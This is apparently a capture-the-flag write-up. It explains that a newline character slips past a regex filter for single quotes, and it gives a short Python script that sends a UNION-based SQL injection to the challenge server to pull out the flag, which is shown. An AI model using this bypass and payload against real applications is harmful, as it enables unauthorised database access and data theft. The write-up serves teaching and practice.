Challenge author: t0m7r00z

We need to bypass this in order to execute an SQL Injection

```if re.search(".'", students_name) or students_name[0] == "'"```

Hint: [regexp security cheatsheet](https://github.com/attackercan/regexp-security-cheatsheet)

We can bypass ```re.search(".'", students_name)``` with a new line **\n**

```python
import re
import requests

r = requests.post("https://infreezy.pythonanywhere.com/vaccine_revenge", data={"students_name":"\n'union select 1,2,flag from s3cret_fl4g--"})
re.search("inf{.*}", r.text)

```
*inf{I_h0p3_v4cC1n3_F@R_c0V1D19_15_R3aL}*
